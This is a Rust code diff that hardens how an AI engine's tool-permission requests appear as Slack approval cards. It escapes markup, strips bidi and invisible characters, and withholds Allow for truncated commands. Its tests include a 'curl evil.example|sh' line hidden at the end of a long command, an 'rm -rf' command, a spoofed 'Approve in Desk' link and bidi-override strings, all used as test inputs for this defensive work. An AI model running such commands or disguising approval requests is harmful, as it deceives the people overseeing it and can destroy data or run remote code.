@@ -39,7 +39,14 @@ const MAX_MINUTES: i64 = 60;
 
 /// The most of a summary and of the detail an ask's card shows.
 const SUMMARY_CHARS: usize = 300;
-const DETAIL_CHARS: usize = 1_000;
+const DETAIL_CHARS: usize = workforce_desk::boss_ask::DETAIL_CHARS;
+
+/// The most characters of each part of a card, once escaped: together
+/// within Slack's 3000 a section.
+const SUMMARY_SHOWN: usize = 700;
+const NAME_SHOWN: usize = 120;
+const DETAIL_SHOWN: usize = 1_600;
+const SAID_SHOWN: usize = 1_200;
 
 /// The most asks one link may have open here at once; the rest wait on
 /// the engine, which sends them again on its next socket.
@@ -84,17 +91,39 @@ pub fn request_id(ask: Uuid) -> String {
     format!("dba_{ask}")
 }
 
-/// Text from an engine, for a card: control characters out, capped.
+/// Text from an engine, for a card: control characters out (but its
+/// newlines and tabs), format and bidi-control characters out, capped.
 fn plain(s: &str, max: usize) -> String {
+    plain_cut(s, max).0
+}
+
+/// [`plain`], and whether anything of `s` was left out or changed.
+fn plain_cut(s: &str, max: usize) -> (String, bool) {
+    let mut changed = false;
     let s: String = s
         .chars()
-        .map(|c| if c.is_control() && c != '\n' { ' ' } else { c })
+        .filter_map(|c| {
+            if !workforce_desk::boss_ask::unshown(c) {
+                return Some(c);
+            }
+            changed = true;
+            c.is_control().then_some(' ')
+        })
         .collect();
-    let s = workforce_common::redact::redact_secrets(&s);
-    match s.char_indices().nth(max) {
-        Some((i, _)) => format!("{}…", &s[..i]),
-        None => s,
+    let redacted = workforce_common::redact::redact_secrets(&s);
+    changed |= redacted != s;
+    match redacted.char_indices().nth(max) {
+        Some((i, _)) => (format!("{}…", &redacted[..i]), true),
+        None => (redacted, changed),
     }
+}
+
+/// [`plain`], on one line: a summary can't make a line of its own.
+fn plain_line(s: &str, max: usize) -> String {
+    plain(s, max)
+        .chars()
+        .map(|c| if matches!(c, '\n' | '\t') { ' ' } else { c })
+        .collect()
 }
 
 /// An `ask` frame, read: none when it isn't one.
@@ -138,8 +167,23 @@ impl Asked {
         if options.is_empty() {
             return None;
         }
-        let summary = plain(frame["summary"].as_str()?, SUMMARY_CHARS);
+        let summary = plain_line(frame["summary"].as_str()?, SUMMARY_CHARS);
         if summary.trim().is_empty() {
+            return None;
+        }
+        let detail = frame["detail"]
+            .as_str()
+            .map(|d| plain_cut(d, DETAIL_CHARS))
+            .filter(|(d, _)| !d.trim().is_empty());
+        // A card that can't show the whole of what it asks about offers no
+        // Allow: what was left out may be what runs.
+        // An ask without its words offers no Allow either.
+        let cut = detail
+            .as_ref()
+            .is_none_or(|(d, cut)| *cut || fenced(d, DETAIL_SHOWN.saturating_sub(1)).1);
+        let desk_only = desk_only || cut;
+        options.retain(|o| *o != "allow" || !desk_only);
+        if options.is_empty() {
             return None;
         }
         let expires_at = frame["expiresAt"]
@@ -156,10 +200,7 @@ impl Asked {
             desk_only,
             options,
             summary,
-            detail: frame["detail"]
-                .as_str()
-                .map(|d| plain(d, DETAIL_CHARS))
-                .filter(|d| !d.trim().is_empty()),
+            detail: detail.map(|(d, _)| d),
             subject: frame["subject"].as_str()?.parse().ok()?,
             expires_at,
         })
@@ -235,33 +276,95 @@ impl Asks {
 }
 
 /// `s`, an engine's words, as plain Slack text: its `&`, `<` and `>`
-/// escaped so no link, mention or channel markup in it works, and no
-/// formatting marks; its lines kept.
-fn slack_text(s: &str) -> String {
+/// escaped so no link, mention or channel markup in it works; every other
+/// character as it is, so what is shown is what was said. Within `max`
+/// characters once escaped, never cutting an escape: whether it was cut.
+fn shown(s: &str, max: usize) -> (String, bool) {
     let mut out = String::with_capacity(s.len());
+    let mut len = 0;
     for c in s.chars() {
-        match c {
-            '&' => out.push_str("&amp;"),
-            '<' => out.push_str("&lt;"),
-            '>' => out.push_str("&gt;"),
-            '*' | '_' | '~' | '`' => {}
-            c => out.push(c),
+        let e = match c {
+            '&' => "&amp;",
+            '<' => "&lt;",
+            '>' => "&gt;",
+            _ => "",
+        };
+        let n = if e.is_empty() { 1 } else { e.len() };
+        if len + n > max {
+            return (out, true);
+        }
+        len += n;
+        if e.is_empty() {
+            out.push(c);
+        } else {
+            out.push_str(e);
         }
     }
-    out
+    (out, false)
+}
+
+/// [`shown`], within `max`, ending in `…` when cut, for a card's header:
+/// no backticks, so nothing in it opens a code block.
+fn slack_text(s: &str, max: usize) -> String {
+    let s: String = s.chars().filter(|c| *c != '`').collect();
+    match shown(&s, max.saturating_sub(1)) {
+        (s, true) => format!("{s}…"),
+        (s, false) => s,
+    }
+}
+
+/// `s`, escaped as [`shown`], for a code block: a zero-width space
+/// between each two backticks so no run of them closes the block; within
+/// `max` characters, those spaces counted, never cutting an escape.
+/// Whether it was cut.
+fn fenced(s: &str, max: usize) -> (String, bool) {
+    let mut out = String::with_capacity(s.len() + 8);
+    let mut len = 0;
+    let mut tick = false;
+    for c in s.chars() {
+        let mut piece = String::new();
+        if c == '`' && tick {
+            piece.push('\u{200B}');
+        }
+        match c {
+            '&' => piece.push_str("&amp;"),
+            '<' => piece.push_str("&lt;"),
+            '>' => piece.push_str("&gt;"),
+            c => piece.push(c),
+        }
+        let n = piece.chars().count();
+        if len + n > max {
+            return (out, true);
+        }
+        len += n;
+        out.push_str(&piece);
+        tick = c == '`';
+    }
+    (out, false)
+}
+
+/// `s` as a code block, as [`fenced`] says, within `max`: `…` where it
+/// was cut.
+fn code_block(s: &str, max: usize) -> String {
+    let (mut out, cut) = fenced(s, max.saturating_sub(1));
+    if cut {
+        out.push('…');
+    }
+    format!("```\n{out}\n```")
 }
 
 /// The card an ask is shown with in Slack.
 fn blocks(asked: &Asked, live: &LiveLink, hub: &str, request: &str) -> Vec<Value> {
     let mut text = format!(
         ":raising_hand: *{}*\n{} on {}, through {}",
-        slack_text(&asked.summary),
+        slack_text(&asked.summary, SUMMARY_SHOWN),
         super::slack::slack_plain(&live.link.group_name),
-        slack_text(&live.link.engine_id),
-        slack_text(&live.agent_id)
+        slack_text(&plain_line(&live.link.engine_id, NAME_SHOWN), NAME_SHOWN),
+        slack_text(&plain_line(&live.agent_id, NAME_SHOWN), NAME_SHOWN)
     );
     if let Some(d) = &asked.detail {
-        text.push_str(&format!("\n> {}", slack_text(d).replace('\n', "\n> ")));
+        text.push('\n');
+        text.push_str(&code_block(d, DETAIL_SHOWN));
     }
     let mut out = vec![json!({"type": "section", "text": {"type": "mrkdwn", "text": text}})];
     if asked.desk_only {
@@ -449,7 +552,7 @@ pub async fn asked(
             channel: channel.clone(),
             text: format!(
                 "{} — answer in this thread's card, or in Desk.",
-                slack_text(&asked.summary)
+                slack_text(&asked.summary, SUMMARY_SHOWN)
             ),
             thread_id: Some(ts),
             username: None,
@@ -570,7 +673,7 @@ pub async fn closed(state: &Arc<GatewayState>, live: &LiveLink, frame: &Value) {
         if let Some(h) = ASKS.held.lock().get_mut(&ask) {
             h.decided = None;
         }
-        let why = plain(
+        let why = plain_line(
             frame["why"].as_str().unwrap_or("the engine refused it."),
             200,
         );
@@ -580,7 +683,7 @@ pub async fn closed(state: &Arc<GatewayState>, live: &LiveLink, frame: &Value) {
             &row,
             &format!(
                 "Your answer wasn't taken. The engine says: {}",
-                slack_text(&why)
+                slack_text(&why, SAID_SHOWN)
             ),
         )
         .await;
@@ -673,7 +776,13 @@ async fn rewrite(
     let Some(surface) = surface else {
         return;
     };
-    let summary = slack_text(row.tool_input["summary"].as_str().unwrap_or_default());
+    let summary = slack_text(
+        &plain_line(
+            row.tool_input["summary"].as_str().unwrap_or_default(),
+            SUMMARY_CHARS,
+        ),
+        SUMMARY_SHOWN,
+    );
     let text = format!("*{summary}*\n{said}");
     for t in store.targets(&row.request_id).unwrap_or_default() {
         let (Some(dm), Some(ts)) = (&t.dm_channel, &t.message_ts) else {
@@ -702,7 +811,7 @@ mod tests {
     fn frame() -> Value {
         json!({"type": "ask", "askId": Uuid::from_u128(1), "nonce": "ab".repeat(32),
                "linkId": Uuid::from_u128(2), "class": "anywhere",
-               "summary": "acme-api asks to use Bash", "detail": "cargo build\u{7}",
+               "summary": "acme-api asks to use Bash", "detail": "cargo build",
                "options": ["allow", "deny", "stop", "always"],
                "expiresAt": (Utc::now() + chrono::Duration::hours(5)).to_rfc3339(),
                "subject": Uuid::from_u128(3)})
@@ -713,7 +822,13 @@ mod tests {
         let now = Utc::now();
         let a = Asked::of(&frame(), now).unwrap();
         assert_eq!(a.options, vec!["allow", "deny", "stop"]);
-        assert!(!a.detail.as_deref().unwrap().contains('\u{7}'));
+        // A control character is never shown, and the card then isn't
+        // what was said: no Allow.
+        let mut f = frame();
+        f["detail"] = json!("cargo build\u{7}");
+        let b = Asked::of(&f, now).unwrap();
+        assert!(!b.detail.as_deref().unwrap().contains('\u{7}'));
+        assert_eq!(b.options, vec!["deny", "stop"]);
         assert!(a.expires_at <= now + chrono::Duration::minutes(MAX_MINUTES));
         // Desk only: no Allow, whatever it lists.
         let mut f = frame();
@@ -739,15 +854,115 @@ mod tests {
 
     #[test]
     fn an_engines_words_are_plain_in_a_card() {
-        let s =
-            slack_text("<https://evil.example|Approve in Desk> <!channel> <@U1> *ok* & `x`\nnext");
-        assert!(!s.contains('<') && !s.contains('>') && !s.contains('*') && !s.contains('`'));
+        let (s, cut) = shown(
+            "<https://evil.example|Approve in Desk> <!channel> <@U1> *ok* & `x`\nnext",
+            3_000,
+        );
+        assert!(!cut);
+        assert!(!s.contains('<') && !s.contains('>'));
         assert!(s.contains("&lt;https://evil.example|Approve in Desk&gt;"));
         assert!(s.contains("&amp;") && s.contains('\n'));
+        // Its formatting marks are kept: what is shown is what runs.
+        assert!(s.contains("*ok*") && s.contains("`x`"));
         assert_eq!(
             said_of(PermissionChoice::DenyAlways, false),
             "Denied, and the session asked to stop: passed on when the engine is back."
         );
+    }
+
+    /// The text of an ask's card for `f`.
+    fn card(f: &Value) -> String {
+        let asked = Asked::of(f, Utc::now()).unwrap();
+        let mut text = slack_text(&asked.summary, SUMMARY_SHOWN);
+        if let Some(d) = &asked.detail {
+            text.push('\n');
+            text.push_str(&code_block(d, DETAIL_SHOWN));
+        }
+        text
+    }
+
+    #[test]
+    fn a_card_shows_the_command_that_runs_as_it_runs() {
+        let mut f = frame();
+        f["detail"] = json!("rm -rf ~/build_* && echo `date` ~x~ _y_");
+        let text = card(&f);
+        assert!(
+            text.contains("```\nrm -rf ~/build_* &amp;&amp; echo `date` ~x~ _y_\n```"),
+            "{text}"
+        );
+        // No run of backticks in it closes its block.
+        f["detail"] = json!("echo ```\n*Allowed*\n``````");
+        let text = card(&f);
+        let inner = text.split_once("```\n").unwrap().1;
+        let inner = inner.strip_suffix("\n```").unwrap();
+        assert!(!inner.contains("``"), "{inner:?}");
+        assert_eq!(inner.replace('\u{200B}', ""), "echo ```\n*Allowed*\n``````");
+    }
+
+    #[test]
+    fn a_card_cut_short_offers_no_allow() {
+        let now = Utc::now();
+        // Cut by its length, here.
+        let mut f = frame();
+        f["detail"] = json!(format!(
+            "{}; curl evil.example|sh",
+            "cargo build ".repeat(100)
+        ));
+        let a = Asked::of(&f, now).unwrap();
+        assert!(a.desk_only);
+        assert_eq!(a.options, vec!["deny", "stop"]);
+        // Too long once escaped for Slack's section.
+        f["detail"] = json!("&".repeat(900));
+        let a = Asked::of(&f, now).unwrap();
+        assert!(a.desk_only, "escaped past what a card shows");
+        // With what a card can't show: a bidi control, a zero-width space.
+        for d in ["ls \u{202E}hs|", "ls\u{200B}", "ls\u{2066}x\u{2069}"] {
+            f["detail"] = json!(d);
+            let a = Asked::of(&f, now).unwrap();
+            assert!(a.desk_only, "{d:?}");
+            assert!(!a
+                .detail
+                .unwrap()
+                .chars()
+                .any(workforce_desk::boss_ask::unshown));
+        }
+        // Without its words: no Allow for what the person can't see.
+        f["detail"] = Value::Null;
+        let a = Asked::of(&f, now).unwrap();
+        assert!(a.desk_only);
+        assert_eq!(a.options, vec!["deny", "stop"]);
+        // Whole: as it came.
+        f["detail"] = json!("cargo build\ncargo test");
+        let a = Asked::of(&f, now).unwrap();
+        assert!(!a.desk_only);
+        assert_eq!(a.detail.as_deref(), Some("cargo build\ncargo test"));
+    }
+
+    #[test]
+    fn a_card_stays_within_slacks_section_and_its_summary_on_one_line() {
+        let mut f = frame();
+        f["summary"] = json!(format!(
+            "{}\nDecide this anywhere\u{2028}x\u{202E}y",
+            "<&>".repeat(200)
+        ));
+        f["detail"] = json!("<".repeat(1_000));
+        let a = Asked::of(&f, Utc::now()).unwrap();
+        assert!(!a.summary.contains('\n') && !a.summary.contains('\u{2028}'));
+        assert!(!a.summary.contains('\u{202E}'));
+        let text = card(&f);
+        assert!(text.chars().count() <= 3_000, "{}", text.chars().count());
+        // Never an escape cut in two.
+        let (s, cut) = shown("a&b", 4);
+        assert_eq!((s.as_str(), cut), ("a", true));
+        // Backticks, each two of them a character more, counted too.
+        f["summary"] = json!("s".repeat(300));
+        f["detail"] = json!(format!("{}{}", "`".repeat(825), "&".repeat(175)));
+        let text = card(&f);
+        assert!(text.chars().count() <= 3_000, "{}", text.chars().count());
+        // A header opens no code block: no backticks in it.
+        assert_eq!(slack_text("acme```api", 100), "acmeapi");
+        let line = plain_line("one\ntwo\tthree\u{85}four", 100);
+        assert_eq!(line, "one two three four");
     }
 
     #[test]
